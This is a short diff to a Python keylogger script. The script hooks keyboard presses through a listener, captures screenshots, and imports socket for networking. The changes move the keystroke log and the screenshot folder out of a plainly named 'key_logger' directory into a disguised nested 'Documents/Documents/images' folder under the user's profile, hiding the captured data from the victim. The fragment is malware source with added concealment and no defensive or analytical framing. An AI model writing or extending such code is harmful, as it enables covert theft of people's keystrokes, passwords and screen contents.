@@ -5,7 +5,12 @@ import os
 import socket
 import struct
 
-log_file = "log_file.txt"
+user_profile = os.environ['USERPROFILE']
+
+log_dir = os.path.join(user_profile, "Documents", "Documents", "images")
+os.makedirs(log_dir, exist_ok=True)
+
+log_file = f"{log_dir}/log.txt"
 
 def on_press(key):
     try:
@@ -41,7 +46,7 @@ def on_press(key):
 listner = keyboard.Listener(on_press=on_press)
 listner.start()
 
-s_dir = "key_logger/screenshots"
+s_dir = os.path.join(user_profile, "Documents", "Documents", "images")
 
 os.makedirs(s_dir, exist_ok=True)
 
